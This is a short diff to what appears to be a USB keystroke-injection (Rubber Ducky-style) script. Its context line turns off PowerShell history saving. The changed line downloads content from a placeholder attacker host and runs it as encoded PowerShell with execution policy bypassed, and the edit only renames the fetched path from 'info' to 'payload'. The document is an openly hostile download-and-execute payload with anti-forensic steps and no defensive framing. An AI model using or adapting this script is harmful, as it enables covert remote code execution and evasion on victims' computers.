@@ -12,6 +12,6 @@ STRING Set-PSReadlineOption -HistorySaveStyle SaveNothing
 DELAY 300
 ENTER
 DELAY 300
-STRING $u='http://attackerIP:attackerPORT/info';$r=Invoke-WebRequest -Uri $u -UseBasicParsing;powershell -nop -Exec Bypass -enc $r
+STRING $u='http://attackerIP:attackerPORT/payload';$r=Invoke-WebRequest -Uri $u -UseBasicParsing;powershell -nop -Exec Bypass -enc $r
 DELAY 300
 ENTER
